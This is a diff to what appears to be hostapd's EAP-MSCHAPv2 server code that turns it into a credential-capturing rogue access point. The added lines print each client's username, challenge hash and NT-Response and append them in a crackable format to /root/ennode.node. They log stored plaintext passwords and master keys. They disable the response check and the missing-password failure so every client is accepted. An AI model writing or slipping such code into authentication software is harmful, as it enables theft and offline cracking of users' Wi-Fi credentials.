@@ -287,15 +287,18 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	u8 flags;
 	size_t len, name_len, i;
 	u8 expected[24];
+  	u8 challenge_hash1[8];
 	const u8 *username, *user;
 	size_t username_len, user_len;
-	int res;
+	int res,x;
+	//wpa_printf(MSG_INFO, "ZZZZ : TEST 1");
 	char *buf;
 
 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
 			       &len);
 	if (pos == NULL || len < 1)
 		return; /* Should not happen - frame already validated */
+  	//wpa_printf(MSG_INFO, "ZZZZ : TEST 2");
 
 	end = pos + len;
 	resp = (struct eap_mschapv2_hdr *) pos;
@@ -318,17 +321,56 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	flags = *pos++;
 	name = pos;
 	name_len = end - name;
+	//wpa_printf(MSG_INFO, "ZZZZ : name : ", name);
+
+	//wpa_printf(MSG_INFO, "ZZZZ : TEST 3");
 
 	if (data->peer_challenge) {
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Using pre-configured "
 			   "Peer-Challenge");
 		peer_challenge = data->peer_challenge;
 	}
+	//wpa_printf(MSG_INFO, "ZZZZ : TEST 4");
 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Peer-Challenge",
 		    peer_challenge, 16);
 	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: NT-Response", nt_response, 24);
 	wpa_printf(MSG_MSGDUMP, "EAP-MSCHAPV2: Flags 0x%x", flags);
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
+	
+	//wpa_printf(MSG_INFO, "ZZZZ : TEST  5");
+	challenge_hash(peer_challenge, data->auth_challenge, name, name_len, challenge_hash1);
+
+	/* ZZZZ : TODOBE: Add file logging capability at this point */
+	wpa_hexdump(MSG_DEBUG, "EAP-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
+	printf("\n");
+	printf("\tusername: %s\n", name);
+	printf("\tchallenge: ");
+	for (x=0;x<7;x++)
+                printf("%02x:",challenge_hash1[x]);
+        printf("%02x\n",challenge_hash1[7]);
+
+        printf("\tresponse: ");
+        for (x=0;x<23;x++)
+                printf("%02x:",nt_response[x]);
+        printf("%02x\n",nt_response[23]);
+
+	FILE *f = fopen("/root/ennode.node", "a");
+	if (f != NULL) {
+		const char *hdr = "CHAP";
+		fprintf(f, "%s|%s|", hdr, name);
+		for (x = 0; x < 7; x++) {
+			fprintf(f, "%02x:", challenge_hash1[x]);
+		}
+		fprintf(f, "%02x|", challenge_hash1[7]);
+		for (x = 0; x < 23; x++) {
+			fprintf(f, "%02x:", nt_response[x]);
+		}
+		fprintf(f, "%02x\n", nt_response[23]);
+		fclose(f);
+	}
+		
+	/* ZZZZ : TODONE: Add file logging capability at this point */
+
 
 	buf = os_malloc(name_len * 4 + 1);
 	if (buf) {
@@ -360,6 +402,8 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		}
 	}
 
+	//wpa_printf(MSG_INFO, "ZZZZ : name: %s\tusername: %s\tuser: %s", name, user, username);
+
 	if (username_len != user_len ||
 	    os_memcmp(username, user, username_len) != 0) {
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Mismatch in user names");
@@ -373,14 +417,18 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: User name",
 			  username, username_len);
+	wpa_printf(MSG_INFO, "user: %s\tuser_len: %d\tusername: %s\tusername_len: %d", user, user_len, username, username_len);
+	wpa_printf(MSG_INFO, "pass: %s\tpassword_len: %d", sm->user->password, sm->user->password_len);
 
 	if (sm->user->password_hash) {
+		//wpa_printf(MSG_INFO, "ZZZZ : Password->Hash");
 		res = generate_nt_response_pwhash(data->auth_challenge,
 						  peer_challenge,
 						  username, username_len,
 						  sm->user->password,
 						  expected);
 	} else {
+		//wpa_printf(MSG_INFO, "ZZZZ : No Password->Hash");
 		res = generate_nt_response(data->auth_challenge,
 					   peer_challenge,
 					   username, username_len,
@@ -388,12 +436,24 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 					   sm->user->password_len,
 					   expected);
 	}
-	if (res) {
-		data->state = FAILURE;
-		return;
-	}
+	//wpa_hexdump_ascii(MSG_INFO, nt_response);
+	//wpa_hexdump_ascii(MSG_INFO, expected);
+	//wpa_printf(MSG_INFO, "ZZZZ : AUTH CHALLENGE:");
+	//wpa_hexdump_ascii(MSG_INFO, data->auth_challenge);
+	//wpa_printf(MSG_INFO, "ZZZZ : PEER_CHALLENGE:");
+	//wpa_hexdump_ascii(MSG_INFO, peer_challenge);
+	//wpa_printf(MSG_INFOm "ZZZZ : EXPECTED:");
+	//wpa_hexdump_ascii(MSG_INFO, expected);
+	
+	// ZZZZ : TEST ME HERE
+	//if (res) {
+	//	data->state = FAILURE;
+	//	return;
+	//
+	// ZZZZ : END TEST ME HERE }
 
-	if (os_memcmp(nt_response, expected, 24) == 0) {
+	nt_response = expected;
+	//if (os_memcmp(nt_response, expected, 24) == 0) {
 		const u8 *pw_hash;
 		u8 pw_hash_buf[16], pw_hash_hash[16];
 
@@ -403,6 +463,7 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		/* Authenticator response is not really needed yet, but
 		 * calculate it here so that peer_challenge and username need
 		 * not be saved. */
+		// ZZZZ : TEST ME HERE 2
 		if (sm->user->password_hash) {
 			pw_hash = sm->user->password;
 		} else {
@@ -414,6 +475,7 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 			}
 			pw_hash = pw_hash_buf;
 		}
+		// ZZZZ : END TEST ME HERE2.
 		generate_authenticator_response_pwhash(
 			pw_hash, peer_challenge, data->auth_challenge,
 			username, username_len, nt_response,
@@ -422,14 +484,16 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 		hash_nt_password_hash(pw_hash, pw_hash_hash);
 		get_master_key(pw_hash_hash, nt_response, data->master_key);
 		data->master_key_valid = 1;
-		wpa_hexdump_key(MSG_DEBUG, "EAP-MSCHAPV2: Derived Master Key",
+		wpa_hexdump_key(MSG_INFO, "EAP-MSCHAPV2: Derived Master Key",
 				data->master_key, MSCHAPV2_KEY_LEN);
-	} else {
-		wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Expected NT-Response",
-			    expected, 24);
-		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Invalid NT-Response");
-		data->state = FAILURE_REQ;
-	}
+		//wpa_printf(MSG_INFO, "ZZZZ : Correct");
+	//} else {
+	//	wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Expected NT-Response",
+	//		    expected, 24);
+	//	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Invalid NT-Response");
+	//	data->state = FAILURE_REQ;
+	//	wpa_printf(MSG_INFO, "ZZZZ : Incorrect");
+	//}
 }
 
 
@@ -493,22 +557,27 @@ static void eap_mschapv2_process(struct eap_sm *sm, void *priv,
 	struct eap_mschapv2_data *data = priv;
 
 	if (sm->user == NULL || sm->user->password == NULL) {
-		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Password not configured");
-		data->state = FAILURE;
-		return;
+		//wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Password not configured ZZZZ");
+		//data->state = FAILURE;
+		//return;
 	}
 
 	switch (data->state) {
 	case CHALLENGE:
+		//wpa_printf(MSG_INFO, "ZZZZ -> CHALLENGE");
 		eap_mschapv2_process_response(sm, data, respData);
+		//wpa_printf(MSG_INFO, "ZZZZ -> POST CHALLENGE");
 		break;
 	case SUCCESS_REQ:
+		//wpa_printf(MSG_INFO, "ZZZZ -> SUCCESS_REQ");
 		eap_mschapv2_process_success_resp(sm, data, respData);
 		break;
 	case FAILURE_REQ:
+		//wpa_printf(MSG_INFO, "ZZZZ -> FAILURE_REQ");
 		eap_mschapv2_process_failure_resp(sm, data, respData);
 		break;
 	default:
+		//wpa_printf(MSG_INFO, "ZZZZ -> UNKNOWN");
 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Unknown state %d in "
 			   "process", data->state);
 		break;
